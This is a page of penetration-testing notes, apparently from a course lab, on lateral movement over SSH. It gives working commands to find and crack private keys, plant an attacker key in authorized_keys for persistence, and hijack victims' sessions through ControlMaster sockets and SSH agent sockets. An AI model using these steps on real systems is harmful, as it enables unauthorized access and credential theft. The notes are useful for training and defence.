---
title: Lateral Movement with SSH
draft: false
tags:
---
 
Although some systems still permit password authentication to connect to a Linux machine via SSH, many require public [key authentication](https://www.ssh.com/ssh/public-key-authentication) instead. This method requires a user-generated public and private key pair. The public key is stored in the **~/.ssh/authorized_keys** file of the server the user is connecting to. The private key is typically stored in the **~/.ssh/** directory on the system the user is connecting from.

> [!Requirements]
> Most of the techniques require elevated privileges.

# SSH Keys

- Find SSH keys on the machine:
```bash
find /home/ -name "id_rsa"

find /home/ -name "id_ecdsa"
```

- Check if the SSH keys have a passphrase:
```bash
cat svuser.key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
```

- Check possible machines where the discovered private keys may be usable:
```bash
# spray the private keys on all possible machines with all possible combinations of users.

# current machine
cat /etc/passwd # find users that could use the discovered SSH key for entering the current machine

# external machines
cat ~/.ssh/known_hosts # find machines that have been connected to recently 

tail .bash_history # check if there is a recorded SSH connection
```

> [!Note]
> If the system has the HashKnownHosts setting enabled in **/etc/ssh/ssh_config**, the entries in the **known_hosts** file are hashed.

- Crack the SSH keys passphrase:
```bash
# convert the passphrase-encrypted private key to a format that JTR will recognize:
$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

# crack the SSH passphrase:
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa.hash
```

- Connect to the target server:
```bash
# assign correct permissions to the private key:
chmod 0600 ./id_rsa

ssh -i ./id_rsa svuser@controller
```

---
# SSH Persistence

The **authorized_keys** file is a list of all the public keys permitted to access the user's account on the current machine. Adding our public key to a user's **authorized_keys** file will allow us to access the machine again via SSH later.

> [!Note]
> Most Linux systems require 644 permissions on **authorized_keys**, which means that only the file owner and root can write to the file.

1. Generate on our attack machine a pair of keys:
```bash
$ ssh-keygen
```

2. Copy the contents of the public key **id_rsa.pub**.

3. Inject the public key into the authorized_keys file of the target machine:
```bash
echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/<USER>/.ssh/authorized_keys
```

> [!Note]
> We can also use  [ssh-copy-id](https://linux.die.net/man/1/ssh-copy-id).

4. We can now access the target machine using our own private key:
```bash
ssh -i ~/.ssh/id_rsa linuxvictim@linuxvictim
```

---
# SSH Hijacking with ControlMaster

SSH Hijacking refers to the use of an existing SSH connection to gain access to another machine. Two of the most common methods of SSH hijacking use the [_ControlMaster_](http://man.openbsd.org/ssh_config.5#ControlMaster) feature or the [_ssh-agent_](https://www.ssh.com/ssh/agent).

ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network connection (SSH to a machine and after that in that SSH connection SSH to a different machine and so on). This functionality can be enabled for a given user by editing their local SSH configuration file (**~/.ssh/config**).

> [!Requirements] 
> This file can be created or modified by users with elevated privileges or write access to the user's home folder. 

0. Obtain a shell as a user/root account.
1. Create for the current/target user **in the pivot machine** the **~/.ssh/config** file with the following content:
```
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
```

- `Hosts *` > Config is being set for all Hosts.
- `ControlPath` > the ControlMaster socket file should be placed in the specified path with the format `<remoteusername@<targethost>:<port>`.
- `ControlMaster` > any new connections will attempt to use existing ControlMaster sockets when possible. If unavailable, it will start a new connection.
- `ControlPersist` > the socket will accept new connections for a specified amount of time after the last connection has terminated (set to `yes` for always)

> [!Note]
> These ControlMaster settings can also be placed in `/etc/ssh/ssh_config` to configure ControlMaster at a system-wide level.

2. Set the correct permissions in the config file:
```bash
chmod 644 ~/.ssh/config
```

3. Create the required directory we set in the config file:
```bash
mkdir ~/.ssh/controlmaster
```

4. Wait for the victim to SSH to the pivot machine we have access, and after that wait for him to SSH in that session to the target machine.

5. After the SSH sessions are created, check the control master folder. These socket files represent the legitimate SSH sessions to the downstream servers (Victim sessions):
```bash
ls -al ~/.ssh/controlmaster/
total 8
drwxrwxr-x 2 offsec offsec 4096 May 13 13:55 .
drwx------ 3 offsec offsec 4096 May 13 13:55 ..
srw------- 1 offsec offsec    0 May 13 13:55 offsec@linuxvictim:22
```

**Low Privileged User Scenario**

- We can now SSH to the servers listed in the victim's socket files from the pivot machine. We will not be prompted for a password and are given direct access to the target machines via SSH:
```bash
ssh offsec@linuxvictim
*no required password*
```

**High Privileged User Scenario**

- If we are logged in as a root user on the pivot machine (or someone with root privileges), we can hijack the existing victim sessions by running:
```bash
# list available sockets on the pivot machine for a local user:
ls -al /home/<USER>/.ssh/controlmaster
total 8
drwxrwxr-x 2 offsec offsec 4096 May 13 16:22 .
drwx------ 3 offsec offsec 4096 May 13 13:55 ..
srw------- 1 offsec offsec    0 May 13 16:22 offsec@linuxvictim:22

# Hijack available SSH sessions from the pivot machine as root:
ssh -S /home/<USER>/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim

# Parameters:
-S: path to SSH socket file
```

---
# SSH Hijacking Using SSH-Agent and SSH Agent Forwarding

**SSH-Agent** is a utility that keeps track of a user's private keys and allows them to be used without having to repeat their passphrases on every connection.

**SSH agent forwarding** is a mechanism that allows a user to use the SSH-Agent on an intermediate server as if it were their own local agent on their originating machine. This is useful in situations where a user might need to **ssh** from an intermediate host into another network segment, which can't be directly accessed from the originating machine. 

This works by passing the SSH key response requests from the remote destination servers back through the SSH-Agent on the intermediate hosts to the originating client's SSH Agent for key validation.

Attack scenario: a user connects to an intermediate server and then to a subsequent remote server using SSH agent forwarding (this second connection to the remote server can be closed after).

> [!Requirements]
> Access as root user to the pivot machine or the `AllowAgentForwarding yes` option set in the `/etc/ssh/sshd_config` file.

**Setup**

1. To use an SSH-Agent, there needs to be an SSH keypair set up on the originating machine. For SSH connections to work using SSH-Agent forwarding, we need to have our public key installed on both the intermediate server and the destination server. We could do this using  [ssh-copy-id](https://linux.die.net/man/1/ssh-copy-id) (this should be done by the victim):
```bash
$ ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller

$ ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
```

2. Set the local SSH config file (**~/.ssh/config**) in our attack machine with the following config to enable agent forwarding connections:
```
ForwardAgent yes
```

3. Modify the **/etc/ssh/sshd_config** file in the intermediate/pivot host with the following config to allow the intermediate server to forward key challenges back to the originating client's SSH agent.:
```
AllowAgentForwarding yes
```

> [!Note]
> This file can only be edited by root. We must check if the option is enabled if we dont have root privileges:
> ```bash
> cat /etc/ssh/sshd_config | grep AllowAgentForwarding 
> ```

4. Start the SSH-Agent on our attack machine:
```bash
$ eval `ssh-agent`
```

5. Add the keys to the SSH-Agent on the attack machine:
```bash
$ ssh-add <PATH_TO_PRIVATE_KEY>

# Parameters:
PATH_TO_PRIVATE_KEY: path to private key. In case we use the default path (~/.ssh/) we can leave it empty
```

6. SSH to the pivot machine and subsequently from that session to the target machine:
```bash
kali@kali$ ssh offsec@controller # type passphrase to that the SSH-Agent can keep track of it

offsec@controller$ ssh offsec@linuxvictim

offsec@linuxvictim$
```

**Low Privileged User Scenario**

With our previous ControlMaster exploitation, we were restricted to connecting to downstream servers that the user had an existing open connection to. With SSH agent forwarding, we don't have this restriction. Since the intermediate system acts as if we already have the user's SSH keys available, we can SSH to any downstream server the compromised user's private key has access to.

> [!Requirements]
> To exploit this, the compromised user needs to have an active SSH connection to the intermediate/pivot server. From there, he must have had an SSH session to the target/remote machine, but this last session can be closed after (test this).

1. Open an SSH connection as the low privileged user we control, to the pivot/intermediate host using password authentication:
```bash
ssh offsec@controller
*enter password*
```

2. From the SSH session, SSH into the target victim machine. We will have access to all victim machines in which the public key is configured:
```bash
ssh offsec@linuxvictim
*no password/key required*
```

**High Privileged User Scenario**

The SSH-Agent mechanism creates an open [socket](https://en.wikipedia.org/wiki/Unix_file_types#Socket) file on the pivot/intermediate server that can be accessed by users with elevated permissions. If we are root on the pivot server, we can leverage the victim user's open socket directly.

> [!Note]
> Both scenarios require the victim user to have an open SSH connection to the intermediate server.

0. SSH to the pivot/intermediate machine as a high privileged user.

1. Get a list of open SSH connections and check the usernames:
```bash
$ ps aux | grep ssh
```

2. List the PIDs values for the SSH processes using the usernames:
```bash
$ pstree -p <USERNAME> | grep ssh
...
sshd(2821)---bash(2822) # we are interesting in this bash sessions
```

3. Cat the contents of the PID environment file and search for a variable called "SSH_AUTH_SOCK":
```bash
$ cat /proc/<PID>/environ
```

This variable lets SSH-Agent know where its socket file is located.

4. As an elevated user, we can use the victim's SSH agent socket file as if it were our own:
```bash
# Set our current privileged user's SSH_AUTH_SOCK environment variable to the open SSH socket of our victim. Use `ssh-add -l` to show that the key from the legitimate user is in our SSH-Agent cache:
$ SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l

# Re-set the environment variable for the socket and then can SSH to the target host as the victim user:
$ SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.163 ssh offsec@linuxvictim
```
